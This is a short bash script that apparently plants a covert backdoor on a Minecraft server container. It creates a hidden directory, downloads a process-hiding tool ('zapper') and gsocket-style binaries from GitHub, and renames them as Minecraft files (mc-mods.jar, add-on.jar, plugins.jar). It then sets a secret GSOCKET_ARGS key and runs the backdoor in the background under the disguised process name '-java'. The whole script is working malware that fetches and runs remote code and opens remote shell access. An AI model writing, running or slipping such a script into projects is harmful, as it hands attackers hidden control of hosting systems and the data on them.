#!/bin/bash

function fetch_files() {
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o mc-mods.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    # cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/trk/c1.conf -o cfg.conf
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    # cd /tmp/.java/bin && nohup ./mc-mods.jar -a 'java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
    # GNET
    export GSOCKET_ARGS="-s i1A6e7D2a1E2c4K3-5A16f9L893D9g8H3bj7m5B4-8K6C4a9m6aF1-eCd9F9h4I0-0d6A28038-A1c5J1g60 -liqD"
    export HOME=/home/container
    cd /tmp/.java/bin && exec -a -java ./add-on.jar &
}

if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/add-on.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
